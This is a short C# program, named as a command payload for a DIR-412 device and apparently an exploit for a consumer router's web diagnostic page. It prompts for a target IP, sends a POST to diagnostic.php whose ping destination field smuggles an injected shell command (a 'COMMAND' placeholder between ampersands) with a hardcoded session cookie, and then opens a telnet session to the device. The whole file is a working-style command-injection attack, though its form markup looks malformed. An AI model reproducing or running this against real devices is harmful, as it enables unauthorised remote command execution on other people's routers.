using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Diagnostics;

namespace Dir412_CmdPayload
{
    class Program
    {
        static void Main(string[] args)
        {
            string ipAddress = "192.168.0.1";
            string host = string.Empty;

            Console.WriteLine("ip address: ");
            ipAddress = Console.ReadLine();
            byte[] textBytes = Encoding.ASCII.GetBytes("<form><input> name=\"act\" value=\"ping\"/><input> name=\"dst\" value=\"%26%20COMMAND%26\"/></form>");

            host = string.Format("http://{0}/diagnostic.php", ipAddress);

            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(host);
            req.ContentType = "application/x-www-form-urlencoded";
            req.Method = "POST";

            req.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36";
            req.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
            req.Host = ipAddress;
            req.ContentLength = textBytes.Length;
            
            req.Headers.Add(HttpRequestHeader.Cookie, "uid=guYiHy1yJ8");
            req.Headers.Add(HttpRequestHeader.AcceptEncoding, "gzip,deflate,sdch");
            req.AllowWriteStreamBuffering = true;

            using (var reqStream = req.GetRequestStream())
            {
                reqStream.Write(textBytes, 0, textBytes.Length);
            }

            var res = req.GetResponse();
            var resStream = res.GetResponseStream();

            Process.Start(new ProcessStartInfo(@"C:\windows\system32\cmd", string.Format("telnet {0}", ipAddress)));
        }
    }
}
